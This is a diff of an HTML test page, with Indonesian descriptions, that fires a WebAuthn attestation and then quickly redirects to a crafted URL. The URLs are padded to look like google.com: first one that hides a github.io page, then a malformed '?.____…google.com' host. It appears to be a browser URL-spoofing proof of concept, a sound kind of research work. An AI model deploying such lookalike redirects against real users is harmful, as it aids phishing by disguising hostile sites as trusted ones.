@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Fast WebAuthn Attestation + Redirect</title>
+<title>WebAuthn Attestation + ?.____...google.com Probe</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #121212; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; color: #e5e5e5; }
@@ -19,9 +19,9 @@
 <body>
 
 <div class="panel">
-  <h2>Fast WebAuthn Attestation &amp; Redirect</h2>
-  <p>Memicu <code>navigator.credentials.create()</code> (<code>attestation: "direct"</code>) lalu langsung menjalankan <code>location.replace()</code> ke <code>https://google.com____________________________________________________________.artha231.github.io/Safari-Iphone-/</code>.</p>
-  <button id="fastGoBtn">Trigger WebAuthn &amp; Fast Redirect</button>
+  <h2>WebAuthn Attestation + ?.____...google.com</h2>
+  <p>Memicu <code>navigator.credentials.create()</code> (<code>attestation: "direct"</code>) lalu menjalankan <code>location.replace()</code> ke <code>https://?.____________________________________________________________google.com</code>.</p>
+  <button id="runShortBtn">Trigger WebAuthn &amp; Fast Redirect</button>
   <div id="log">[*] Ready...</div>
 </div>
 
@@ -29,9 +29,9 @@
 (function () {
   'use strict';
 
-  var TARGET_URL = 'https://google.com____________________________________________________________.artha231.github.io/Safari-Iphone-/';
+  var TARGET_URL = 'https://?.____________________________________________________________google.com';
   var FAST_DELAY_MS = 10;
-  var btn = document.getElementById('fastGoBtn');
+  var btn = document.getElementById('runShortBtn');
   var logEl = document.getElementById('log');
   var t0 = performance.now();
 
@@ -40,7 +40,7 @@
     var line = `[+${elapsed}ms] ${msg}`;
     logEl.textContent += '\n' + line;
     logEl.scrollTop = logEl.scrollHeight;
-    console.log('[FastWebAuthnRedirect] ' + line);
+    console.log('[ShortTargetProbe] ' + line);
   }
 
   function randomBytes(len) {
@@ -79,7 +79,7 @@
         user: {
           id: randomBytes(16),
           name: 'probe@' + rpId,
-          displayName: 'Fast Probe'
+          displayName: 'Short Target Probe'
         },
         pubKeyCredParams: [
           { type: 'public-key', alg: -7 },
@@ -99,9 +99,12 @@
     btn.disabled = true;
     triggerAttestation();
 
-    queueMicrotask(function () {
-      log(`[microtask] scheduling location.replace in ${FAST_DELAY_MS}ms -> ${TARGET_URL}`);
-    });
+    try {
+      var u = new URL(TARGET_URL);
+      log(`[URL parsed] hostname="${u.hostname}", search="${u.search}"`);
+    } catch (e) {
+      log(`[URL error] ${e.name}: ${e.message}`);
+    }
 
     setTimeout(function () {
       log('[*] Executing window.location.replace...');
